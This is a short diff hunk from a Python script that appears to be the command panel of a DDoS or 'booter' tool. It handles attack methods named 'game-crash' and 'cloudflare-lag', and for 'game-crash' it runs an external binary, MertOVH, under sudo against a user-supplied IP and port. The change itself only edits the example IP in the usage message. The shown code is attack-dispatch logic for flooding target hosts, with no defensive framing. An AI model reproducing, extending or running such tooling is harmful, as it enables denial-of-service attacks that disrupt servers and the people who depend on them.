@@ -584,7 +584,7 @@ def main():
                 os.system(f'sudo ./MertOVH {ip} {port}')
             except IndexError:
                 print('Usage: game-crash <ip> <port>')
-                print('Example: game-crash 192.168.0.1 22')
+                print('Example: game-crash 192.168.x.x 22')
 
         elif "cloudflare-lag" in cnc:
             print('Method "CLOUDFLARE-LAG" not enabled')
